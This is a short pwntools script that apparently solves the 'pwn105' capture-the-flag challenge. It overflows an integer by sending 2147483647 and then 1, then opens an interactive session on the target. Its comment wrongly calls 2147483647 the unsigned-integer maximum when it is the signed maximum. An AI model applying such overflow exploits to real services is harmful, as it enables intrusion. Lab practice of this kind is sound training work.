from pwn import *

"""
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""

# set process/connect to service
pro = process("./pwn105.pwn105")
#pro = remote("10.10.41.218", 9005)

# maximum value of unsigned integer 2147483647
pro.sendline(b"2147483647")

pro.recvuntil(b"]>>")

# plus one, to overflow the amount an unsigned integer can take
pro.sendline(b"1")

pro.interactive()
pro.close()
